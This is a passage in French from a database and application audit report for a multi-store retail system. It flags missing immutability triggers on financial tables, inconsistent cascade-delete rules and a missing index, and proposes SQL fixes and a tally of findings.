**🔴 CRITIQUE — `customer_payments` sans aucun trigger d'immuabilité**
Même requête, même constat : c'est un registre financier (encaissements clients) au même titre que `orders`, mais rien n'empêche un `UPDATE`/`DELETE` après écriture.
*Correctif :* même fonction générique, `CREATE TRIGGER trg_customer_payments_no_update_delete BEFORE UPDATE OR DELETE ON customer_payments EXECUTE FUNCTION prevent_update_delete();` — aucun nouveau code à écrire.

**🔴 CRITIQUE — Incohérence `ON DELETE` entre tables financières liées à `stores`, contournant les triggers d'immuabilité ligne-à-ligne**
```
orders_store_id_fkey                       :: ON DELETE CASCADE
purchase_orders (purchases_store_id_fkey)  :: ON DELETE CASCADE
cash_drawers_store_id_fkey                 :: ON DELETE CASCADE
customer_payments_store_id_fkey            :: NO ACTION (bloque la suppression)
```
*Scénario :* si une boutique n'a aucune ligne dans `customer_payments`, un `DELETE FROM stores` (accès direct, script d'admin, ou une future route non encore écrite) supprimerait **silencieusement en cascade** tout son historique ventes/achats/caisses — exactement ce que les triggers d'immuabilité ligne-à-ligne sont censés empêcher, mais qui reste possible au niveau boutique entière puisqu'ils ne bloquent que le DELETE direct sur la ligne, pas la cascade FK. Si la boutique a ne serait-ce qu'un paiement client, la suppression échoue — incohérence d'une table financière à l'autre. **Aucune route applicative de suppression de boutique n'existe actuellement** — risque latent, pas exploité, mais l'incohérence de schéma est réelle.
*Correctif :* passer `orders`, `purchase_orders` et `cash_drawers` en `ON DELETE RESTRICT` sur `store_id` (comme `customer_payments`), cohérent avec le principe déjà affirmé « aucune suppression physique des ventes ».

**🟠 MAJEUR — `stock_movements` n'a pas de colonne `store_id`, contredisant la règle documentée dans `README.md`**
Colonnes live : `id, product_id, type, quantity, unit_cost, reference_table, reference_id, user_id, note, created_at` — pas de `store_id`. Le rapport boutique-entière (`products.service.js:540-555`) doit faire une jointure `product_id → products.store_id`. Les seuls index existants sont par `product_id` ou `(reference_table, reference_id)` — **aucun index ne supporte le tri global filtré par boutique**. Invisible à 238 lignes aujourd'hui, deviendra une vraie falaise de performance (scan + tri coûteux) quand le volume grossira.
*Correctif :* dénormaliser `store_id` sur `stock_movements` (cohérent avec le reste du schéma) + index `(store_id, created_at DESC)`.

**🟡 MINEUR — `unit_price`/`purchase_price` acceptent `>= 0` plutôt que `> 0`**
Une ligne de vente ou d'achat à prix zéro passe la contrainte DB sans broncher (potentiellement légitime — échantillon gratuit — mais aussi une porte ouverte si la validation applicative venait à faillir, plus plausible depuis la fonctionnalité « prix éditable en vente »). Non vérifié côté code applicatif dans ce périmètre.

### 5.4 — Nouveaux constats — robustesse (index, triggers, contraintes)

**Triggers d'immuabilité live** (29 au total) : couvrent `orders`, `order_items`, `stock_movements`, `system_logs`, `purchase_orders`, `purchase_order_items`, `stock_transfers`. **Ne couvrent PAS `cash_drawers` ni `customer_payments`** (voir CRITIQUE ci-dessus — c'est la réponse vérifiée en base à cette question précise).

**`orders.invoice_number`** : l'index partiel unique `uq_orders_store_invoice_number (store_id, invoice_number) WHERE invoice_number IS NOT NULL` est conforme au même patron que `order_number` (scopé par boutique, pas global). Pas de bug.

**Index sur tables financières critiques** : bonne couverture sur `orders` (`store_id, created_at`, `store_id, seller_id, created_at`), `products`, `purchase_orders`, `cash_drawers`. `customer_payments` n'a qu'un index sur `customer_id` (suffisant aujourd'hui, les deux seuls sites d'appel filtrent toujours par client) — à surveiller si un rapport boutique-entière est ajouté un jour. `stock_movements` : aucun index adapté (voir MAJEUR ci-dessus).

**Contraintes `CHECK`/`NOT NULL`/FK sur les tables financières** : globalement solides. `ON DELETE` sur les FK non-`store_id` cohérent et prudent (`RESTRICT` sur produit/vendeur, `SET NULL` avec exception de trigger dédiée sur utilisateur). Seul le comportement `store_id` (cascade vs restrict) est incohérent — voir CRITIQUE ci-dessus.

**`user_store.permissions` (JSONB)** : conforme aux attentes — uniquement les 6 clés booléennes connues sur l'ensemble des lignes live, toujours écrites via `jsonb_set(..., Boolean(...))`, jamais un blob JSON brut du client.

---

## 6 — Décompte global

| Périmètre | 🔴 Critique | 🟠 Majeur | 🟡 Mineur |
|---|---|---|---|
| Backend Node.js | 0 | 3 | 5 |
| Frontend React | 0 | 1 | 8 |
| Mobile Flutter | 0 | 2 | 3 *(+ 2 écarts de parité fonctionnelle, non comptés comme défaut)* |
| Base de données PostgreSQL | 3 | 2 | 5 |
| **Total** | **3** | **8** | **21** |

**Constats des audits précédents (3-6 août) re-vérifiés dans ce document :** sur 13 constats distincts couvrant les 4 périmètres, **11 sont confirmés réellement résolus** (pas seulement déclarés), **2 restent en attente d'une décision produit déjà identifiée** (`stock_transfers`/`invoices`), et **aucune régression** n'a été trouvée sur un point antérieurement corrigé.

**Aucune faille critique d'isolation multi-boutique** n'existe dans le code applicatif (backend, frontend, mobile) sur l'ensemble du périmètre vérifié — c'est le constat le plus structurellement rassurant de cet audit. Les 3 constats CRITIQUE de ce document concernent tous l'intégrité de deux tables financières spécifiques en base (absence de trigger d'immuabilité) et une incohérence de règle de suppression en cascade — tous les trois corrigeables en quelques lignes SQL, sans toucher au code applicatif.
